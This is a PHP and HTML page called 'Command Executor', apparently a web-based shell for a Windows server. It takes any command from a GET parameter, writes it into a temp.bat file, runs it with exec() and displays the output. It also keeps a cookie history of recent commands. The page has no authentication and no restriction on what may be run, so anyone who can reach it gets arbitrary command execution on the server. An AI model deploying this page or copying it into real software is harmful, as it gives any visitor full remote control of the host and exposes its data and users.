<!DOCTYPE html>
<html>
<head>
    <title>Command Executor</title>
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        .history-dropdown {
            position: relative;
            display: inline-block;
        }
        
        .history-dropdown-content {
            display: none;
            position: absolute;
            background-color: #f9f9f9;
            min-width: 100%;
            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
            z-index: 1;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .history-dropdown:hover .history-dropdown-content {
            display: block;
        }
        
        .history-item {
            padding: 8px 16px;
            cursor: pointer;
            border-bottom: 1px solid #ddd;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .history-item:hover {
            background-color: #e0e0e0;
        }
        
        .history-clear {
            color: #ff4444;
            font-weight: bold;
        }
        
        .history-clear:hover {
            background-color: #ffdddd;
        }
    </style>
</head>
<body class="w3-container w3-dark-grey w3-padding-32">

<div class="w3-container w3-card-4 w3-white w3-round-large w3-margin-top" style="max-width: 1200px; margin: 0 auto;">
    
    <!-- Header -->
    <div class="w3-container w3-blue w3-round-top">
        <h2 class="w3-margin-0 w3-padding">Command Executor</h2>
        <p class="w3-margin-0 w3-padding w3-small">Execute system commands with history</p>
    </div>
    
    <!-- Main Content -->
    <div class="w3-container w3-padding-24">
        <!-- Command Form -->
        <div class="w3-panel w3-light-grey w3-round w3-padding">
            <form action="index2.php" method="GET" id="commandForm">
                <div class="w3-row">
                    <div class="w3-col m10">
                        <label class="w3-text-blue w3-medium"><b>Enter Command:</b></label>
                        <div class="history-dropdown w3-margin-top">
                            <textarea 
                                name="command" 
                                id="commandInput"
                                class="w3-input w3-border w3-round" 
                                style="height: 100px; resize: vertical;"
                                placeholder="Enter command here..."
                            ><?php echo htmlspecialchars($_GET['command'] ?? ''); ?></textarea>
                            
                            <!-- History Dropdown -->
                            <div class="history-dropdown-content w3-round">
                                <?php
                                // Get command history from cookie
                                $history = [];
                                if (isset($_COOKIE['cmd_history'])) {
                                    $history = json_decode($_COOKIE['cmd_history'], true);
                                    if (!is_array($history)) {
                                        $history = [];
                                    }
                                }
                                
                                // Display history items
                                if (!empty($history)) {
                                    foreach (array_reverse($history) as $index => $cmd) {
                                        echo '<div class="history-item" onclick="useHistoryCommand(\'' . htmlspecialchars(addslashes($cmd)) . '\')">';
                                        echo '<span class="w3-tiny w3-text-grey">#' . (count($history) - $index) . '</span> ';
                                        echo htmlspecialchars(strlen($cmd) > 50 ? substr($cmd, 0, 50) . '...' : $cmd);
                                        echo '</div>';
                                    }
                                    echo '<div class="history-item history-clear" onclick="clearHistory()">';
                                    echo 'Clear All History';
                                    echo '</div>';
                                } else {
                                    echo '<div class="history-item w3-text-grey">';
                                    echo 'No command history';
                                    echo '</div>';
                                }
                                ?>
                            </div>
                        </div>
                    </div>
                    <div class="w3-col m2 w3-padding">
                        <div class="w3-center w3-margin-top">
                            <button type="submit" class="w3-button w3-blue w3-round w3-padding-large w3-hover-dark-blue w3-margin-top">
                                <b>Execute</b>
                            </button>
                            <div class="w3-small w3-text-grey w3-margin-top">
                                History: <?php echo count($history); ?> commands
                            </div>
                        </div>
                    </div>
                </div>
            </form>
        </div>
        
        <!-- Output Section -->
        <div class="w3-margin-top">
            <?php
            $cmd = $_GET['command'] ?? null;
            if ($cmd == null || trim($cmd) == '') {
                echo '
                <div class="w3-panel w3-yellow w3-round w3-padding">
                    <h5><i class="w3-large">⚠</i> No Command Entered</h5>
                    <p>Enter a command in the text area above and click "Execute".</p>
                </div>';
            } else {
                // Update command history
                $history = [];
                if (isset($_COOKIE['cmd_history'])) {
                    $history = json_decode($_COOKIE['cmd_history'], true);
                    if (!is_array($history)) {
                        $history = [];
                    }
                }
                
                // Add new command to history (avoid duplicates by removing first)
                $cmd = trim($cmd);
                $key = array_search($cmd, $history);
                if ($key !== false) {
                    unset($history[$key]);
                }
                
                // Add to beginning and limit to 20 commands
                array_unshift($history, $cmd);
                $history = array_slice($history, 0, 20);
                
                // Save to cookie (30 days expiration)
                setcookie('cmd_history', json_encode($history), time() + (30 * 24 * 60 * 60), '/');
                
                echo '
                <div class="w3-panel w3-blue w3-round w3-padding">
                    <h5><i class="w3-large">▶</i> Executing Command:</h5>
                    <div class="w3-code w3-light-grey w3-round w3-padding">
                        ' . htmlspecialchars($cmd) . '
                    </div>
                </div>';
                
                echo '<div class="w3-panel w3-black w3-round w3-padding w3-margin-top">';
                echo '<h6><b>Command Output:</b></h6>';
                echo '<div class="w3-code w3-dark-grey w3-round w3-padding w3-small" style="overflow-x: auto;">';
                
                $out = null;
                $file = fopen("temp.bat", "w");
                fwrite($file, "cd C:/\nchcp 437\n" . $cmd);
                fclose($file);
                exec("temp.bat", $out);
                
                if (!empty($out)) {
                    foreach ($out as $x) {
                        echo htmlspecialchars($x) . "<br>";
                    }
                } else {
                    echo '<span class="w3-text-grey">No output returned.</span>';
                }
                
                echo '</div></div>';
            }
            ?>
        </div>
        
        <!-- Recent Commands Section -->
        <?php
        if (isset($_COOKIE['cmd_history']) && !empty(json_decode($_COOKIE['cmd_history'], true))) {
            $history = json_decode($_COOKIE['cmd_history'], true);
            echo '
            <div class="w3-panel w3-border-top w3-border-blue w3-padding-16">
                <h5><i class="w3-large">📋</i> Recent Commands</h5>
                <div class="w3-row">';
                
            foreach (array_slice($history, 0, 5) as $index => $cmd) {
                echo '
                <div class="w3-col m4 w3-padding-small">
                    <div class="w3-card w3-light-grey w3-round w3-padding">
                        <span class="w3-badge w3-blue">' . ($index + 1) . '</span>
                        <div class="w3-small w3-margin-top" style="word-break: break-all;">' . 
                            htmlspecialchars(strlen($cmd) > 60 ? substr($cmd, 0, 60) . '...' : $cmd) . 
                        '</div>
                        <button onclick="useHistoryCommand(\'' . htmlspecialchars(addslashes($cmd)) . '\')" 
                                class="w3-button w3-tiny w3-blue w3-round w3-margin-top">
                            Use Again
                        </button>
                    </div>
                </div>';
            }
            
            echo '
                </div>
            </div>';
        }
        ?>
        
        <!-- Footer Note -->
        <div class="w3-panel w3-border-top w3-border-blue w3-padding-16 w3-center">
            <p class="w3-text-grey w3-small">All commands are executed on the server. History is saved in cookies.</p>
        </div>
    </div>
</div>

<script>
    function useHistoryCommand(cmd) {
        document.getElementById('commandInput').value = cmd;
        document.getElementById('commandForm').submit();
    }
    
    function clearHistory() {
        if (confirm('Are you sure you want to clear all command history?')) {
            document.cookie = "cmd_history=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            location.reload();
        }
    }
    
    // Auto-focus the textarea
    document.getElementById('commandInput').focus();
    
    // Keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'Enter') {
            document.getElementById('commandForm').submit();
        }
    });
</script>

</body>
</html>
